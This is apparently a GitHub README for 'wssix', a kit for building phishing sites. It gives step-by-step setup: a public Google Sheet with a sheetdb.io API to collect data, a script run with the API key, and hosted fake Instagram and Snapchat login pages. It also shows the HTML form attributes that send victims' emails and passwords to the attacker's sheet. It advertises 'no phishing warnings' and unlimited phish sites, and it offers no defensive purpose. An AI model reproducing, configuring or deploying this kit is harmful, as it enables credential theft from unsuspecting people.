
# **wssix**
wssix helps you to create your own phishing tool.

## Benefits of this tool

- Admin panel 
- 24/7 Online 
- No phishing warnings on webpage
- Create unlimited custom phish websites


## **CREATING API key** ...

- First you have to create blank google sheet.
- Make this sheet public and inside this sheet type email and password on first two cells like this : ( !! just types these words not your email and password !! )
 ____________   _______________
|___email____| |___password____|
![](https://raw.githubusercontent.com/Harsh-bash/wssix/aurora/images/screenshot.png)



- Now go to [sheetdb.com](https://sheetdb.io/). Create account and click on create new api and inside this paste your google sheet url ( which we created in first step ).
 
- After this your api key is ready. Api is looks like 

```
https://sheetdb.io/api/v1/xvxbpk*******
```




## 
## **Setup Admin and Phishing Panel**  ...

- Clone this repository
```bash
git clone https://github.com/Harsh-bash/wssix
```
- Go to wssix folder
```bash
cd wssix
```
- Now, run script.py file and enter your api key as an argument . For example:
```bash
python3 script.py YOUR-API-KEY
```
- Your files are ready now !!!!

Now host **Admin** folder and **client** folder.

For hosting : 

- [**Netlify**](https://netlify.com/)
- [**Render**](https://render.com/)

**After hosting client folder you can access phish pages with /**
```
https://*******.***/instagram
```
```
https://*******.***/snapchat
```
### You can see phished credentials on admin panel.

## **How this work!!**

**wssix use [**google sheets**](https://render.com/) for database and [**sheetdb.io**](https://sheetdb.io) for api.**

To send data from your **HTML FORM** to google sheets
- set you form tag **id,method,action and submit** as follow:

```javascript
<form id="sheetdb-form" method="post" action="https://YOUR_SHEETDB_API">
```

- Set **name** in username input tag as follow : 
```javascript
name="data[email]"
```

- Set **name** in password input tag as follow : 
```javascript
name="data[password]"
```

- Set Submit button as follow : 
```javascript
type="submit" name="submit"
```

**Now all data from this form is save in your google sheets and you can access it with this admin panel.**

